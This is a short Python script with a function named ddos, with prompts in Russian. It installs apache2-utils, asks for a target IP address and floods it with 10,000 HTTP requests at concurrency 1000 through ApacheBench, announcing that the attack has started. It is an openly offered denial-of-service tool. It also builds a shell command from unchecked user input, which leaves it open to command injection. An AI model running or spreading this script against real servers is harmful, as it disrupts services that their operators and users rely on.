import subprocess
import time

def ddos():
    print("Method was been created zxclxner")
    
    
    subprocess.call("apt install apache2-utils", shell=True)

    time.sleep(2)

    ip = input("Введите айпи адресс: ")



    time.sleep(2)

    print("Атака начинается...\n\n")
    subprocess.call("ab -n 10000 -c 1000 http://"+ip+"/", shell=True)
    print("Атака началась....")

